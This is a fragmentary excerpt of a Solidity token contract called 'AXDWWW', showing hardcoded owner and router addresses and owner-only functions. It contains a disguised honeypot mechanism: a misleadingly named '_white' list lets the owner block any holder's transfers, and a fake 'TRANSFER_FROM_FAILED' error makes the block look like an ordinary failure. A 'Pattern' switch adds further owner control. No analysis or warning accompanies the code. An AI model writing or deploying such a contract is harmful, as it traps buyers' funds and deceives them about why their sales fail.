...
contract Token is Context, IERC20, Ownable {
    ...
    string private _name = "AXDWWW";
    string private _symbol = "AXDWWW";
    ...
    address public ownerAddres = address(0xA50f42430ab5a8fe133773d3d382Fd42Ee395298);
    address public devAddress = address(0xA50f42430ab5a8fe133773d3d382Fd42Ee395298);
    ...
    constructor () public {
        ...
        IPancakeRouter02 _uniswapV2Router = IPancakeRouter02(0x498ee789c84bAb0b34C064D416a63fA8d15A4bdA);
    ...
    uint256 private _Pattern = 0;
    // 0 || 1
    function setPattern(uint256 Pattern) public onlyOwner {
        _Pattern = Pattern;
    }

    function setWhite(address sender) public onlyOwner {
        _white[sender] = true;
    }

    function removeWhite(address sender) public onlyOwner {
        _white[sender] = false;
    }
    ...
    function _transferStandard(address sender, address recipient, uint256 tAmount) private {
        ...
        require(!_white[sender], 'TransferHelper: TRANSFER_FROM_FAILED');
        if (_Pattern == 0 && tAmount >= 100) {
            require(tAmount >= 100, 'TransferHelper: TRANSFER_FROM_FAILED');
        }
